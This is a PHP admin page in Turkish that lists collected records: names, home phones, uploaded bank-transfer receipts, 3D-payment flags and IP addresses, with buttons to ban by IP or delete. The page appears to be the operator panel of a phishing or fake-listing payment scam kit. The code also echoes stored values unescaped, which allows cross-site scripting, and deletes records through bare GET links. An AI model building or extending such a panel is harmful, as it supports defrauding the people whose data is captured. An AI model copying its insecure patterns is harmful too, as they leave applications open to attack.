<?php
include('../../../settings/router.php');

try {
    $conn = new PDO($dsn, $user, $password);
    $conn->exec("SET NAMES 'utf8'; SET CHARSET 'utf8'");
} catch (PDOException $e) {
    print $e->getMessage();
}

?>
<div id="content">
    <div class="d-flex align-items-center justify-content-between" style="padding-bottom: 30px">
        <h4>İlanlar</h4>
        <button type="button" class="btn btn-danger" style="margin-right: 30px;"><a style="color:white; text-decoration:none;" href="ilanlar/deleteall.php?type=havale">HEPSİNİ SİL</a></button>
    </div>
    <table class="table">
     <tr>
         <th>#</th>
         <th>Ad</th>
         <th>Soyad</th>
         <th>Telefon</th>
         <th>Makbuz</th>
         <th>IP</th>
         <th>Banla</th>
         <th>Sil</th>
     </tr>
        <?php 
            $query = $conn->query("SELECT * FROM info", PDO::FETCH_ASSOC);
            if ($query->rowCount()){
                foreach( $query as $row ){
        ?>
         <tr>
             <td><?=$row['id']?></td>
             <td><?=$row['firstName']?></td>
             <td><?=$row['lastName']?></td>
             <td><?=$row['homePhone']?></td>
             <td>
                 <?php
                    $type = $row['type'];
                    $makbuz = $row['makbuz'];
                    if($type == '3D') {
                        echo '3D olarak işaretlenmiş';
                    } else {
                        if(empty($makbuz)){
                            echo 'Makbuz yüklenmedi';
                        }else{
                            echo 'Makbuz yüklendi';
                            echo "<a class='block' href='../images/$makbuz' target='_blank'>Tıkla</a>";
                        }
                    }
                 ?>
             </td>
             <td><?=$row['ip']?></td>
             <td><button type="button" class="btn btn-primary banButton"><a style="color:white; text-decoration:none;">Banla</a></button></td>
             <td><button type="button" class="btn btn-danger"><a style="color:white; text-decoration:none;" href="ilanlar/sil.php?id=<?=$row['id'];?>">Sil</a></button></td>
         </tr>
         <?php
     }}
     ?>
    </table>
     <style>
         .block{
             display: block;
         }
     </style>
     <script>
         let empty;
         const banButton = document.querySelector('.banButton');
         banButton.addEventListener('click', () => {
            let checkFn = function () {
                $.ajax({
                    type: "POST",
                    url: "ilanlar/ban.php",
                    data: {
                        ip: `<?=$row['ip']?>`
                    },
                    dataType: "JSON",
                    success: function (data) {
                        if(data.type == 'success'){
                            $.notify({
                                type: 'success',
                                message: 'Banlandı <i class="fas fa-check-circle"></i>'
                            });
                        }
        
                    },
                });
            };
            checkFn();
        })
     </script>
</div>
</body>
</html>
